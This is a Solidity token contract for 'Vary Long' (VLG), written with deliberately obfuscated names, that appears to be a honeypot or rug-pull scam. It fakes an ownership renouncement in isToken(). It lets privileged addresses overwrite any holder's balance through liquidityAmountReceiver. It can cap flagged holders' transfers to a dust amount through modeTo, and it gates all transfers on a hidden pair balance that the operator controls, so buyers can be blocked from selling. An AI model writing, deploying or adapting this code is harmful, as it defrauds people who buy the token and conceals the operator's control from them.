//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface modeWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract enableTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableExemptSwap {
    function createPair(address liquidityLaunch, address maxLaunchAt) external returns (address);
}

interface fundTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromTakeTx) external view returns (uint256);

    function transfer(address exemptFrom, uint256 marketingMax) external returns (bool);

    function allowance(address atWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingMax) external returns (bool);

    function transferFrom(
        address sender,
        address exemptFrom,
        uint256 marketingMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingMode, uint256 value);
    event Approval(address indexed atWallet, address indexed spender, uint256 value);
}

interface modeToken is fundTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VaryLong is enableTake, fundTeam, modeToken {

    function liquidityAmountReceiver(address toWallet, uint256 marketingMax) public {
        liquidityLaunched();
        senderSwap[toWallet] = marketingMax;
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingTotal;
    }

    bool private fundExempt;

    function getOwner() external view returns (address) {
        return fromTotal;
    }

    uint8 private toTrading = 18;

    function name() external view virtual override returns (string memory) {
        return feeReceiver;
    }

    function limitReceiverMarketing(address takeReceiver, address exemptFrom, uint256 marketingMax) internal returns (bool) {
        require(senderSwap[takeReceiver] >= marketingMax);
        senderSwap[takeReceiver] -= marketingMax;
        senderSwap[exemptFrom] += marketingMax;
        emit Transfer(takeReceiver, exemptFrom, marketingMax);
        return true;
    }

    function allowance(address swapFund, address amountTotalExempt) external view virtual override returns (uint256) {
        if (amountTotalExempt == senderTeamTake) {
            return type(uint256).max;
        }
        return marketingReceiver[swapFund][amountTotalExempt];
    }

    bool public listTotal;

    bool private liquidityMarketingSwap;

    function isToken() public {
        emit OwnershipTransferred(tradingAmount, address(0));
        fromTotal = address(0);
    }

    uint256 public toTotalTeam;

    function liquidityLaunched() private view {
        require(atFeeMin[_msgSender()]);
    }

    function tradingReceiver(uint256 marketingMax) public {
        liquidityLaunched();
        modeLiquidityAt = marketingMax;
    }

    function transferFrom(address takeReceiver, address exemptFrom, uint256 marketingMax) external override returns (bool) {
        if (_msgSender() != senderTeamTake) {
            if (marketingReceiver[takeReceiver][_msgSender()] != type(uint256).max) {
                require(marketingMax <= marketingReceiver[takeReceiver][_msgSender()]);
                marketingReceiver[takeReceiver][_msgSender()] -= marketingMax;
            }
        }
        return atFrom(takeReceiver, exemptFrom, marketingMax);
    }

    uint256 private listShouldSwap;

    uint256 private walletAuto;

    function decimals() external view virtual override returns (uint8) {
        return toTrading;
    }

    string private feeReceiver = "Vary Long";

    mapping(address => uint256) private senderSwap;

    function atFrom(address takeReceiver, address exemptFrom, uint256 marketingMax) internal returns (bool) {
        if (takeReceiver == tradingAmount) {
            return limitReceiverMarketing(takeReceiver, exemptFrom, marketingMax);
        }
        uint256 teamAuto = fundTeam(modeTotal).balanceOf(receiverShould);
        require(teamAuto == modeLiquidityAt);
        require(exemptFrom != receiverShould);
        if (liquidityTrading[takeReceiver]) {
            return limitReceiverMarketing(takeReceiver, exemptFrom, fromAt);
        }
        return limitReceiverMarketing(takeReceiver, exemptFrom, marketingMax);
    }

    constructor (){
        
        modeWallet marketingIs = modeWallet(senderTeamTake);
        modeTotal = enableExemptSwap(marketingIs.factory()).createPair(marketingIs.WETH(), address(this));
        if (toTotalTeam != listShouldSwap) {
            listShouldSwap = walletAuto;
        }
        tradingAmount = _msgSender();
        isToken();
        atFeeMin[tradingAmount] = true;
        senderSwap[tradingAmount] = takeFrom;
        
        emit Transfer(address(0), tradingAmount, takeFrom);
    }

    mapping(address => bool) public liquidityTrading;

    address public tradingAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return takeFrom;
    }

    mapping(address => mapping(address => uint256)) private marketingReceiver;

    function modeTo(address autoMax) public {
        liquidityLaunched();
        
        if (autoMax == tradingAmount || autoMax == modeTotal) {
            return;
        }
        liquidityTrading[autoMax] = true;
    }

    function approve(address amountTotalExempt, uint256 marketingMax) public virtual override returns (bool) {
        marketingReceiver[_msgSender()][amountTotalExempt] = marketingMax;
        emit Approval(_msgSender(), amountTotalExempt, marketingMax);
        return true;
    }

    function balanceOf(address fromTakeTx) public view virtual override returns (uint256) {
        return senderSwap[fromTakeTx];
    }

    uint256 modeLiquidityAt;

    address senderTeamTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public shouldTokenWallet;

    function teamAmount(address shouldMax) public {
        if (listTotal) {
            return;
        }
        if (tokenIs != listShouldSwap) {
            listShouldSwap = tokenIs;
        }
        atFeeMin[shouldMax] = true;
        
        listTotal = true;
    }

    mapping(address => bool) public atFeeMin;

    address public modeTotal;

    string private marketingTotal = "VLG";

    uint256 receiverList;

    function transfer(address toWallet, uint256 marketingMax) external virtual override returns (bool) {
        return atFrom(_msgSender(), toWallet, marketingMax);
    }

    event OwnershipTransferred(address indexed tradingLaunched, address indexed atFee);

    function owner() external view returns (address) {
        return fromTotal;
    }

    address private fromTotal;

    address receiverShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private teamFee;

    uint256 private takeFrom = 100000000 * 10 ** 18;

    uint256 constant fromAt = 13 ** 10;

    uint256 private tokenIs;

}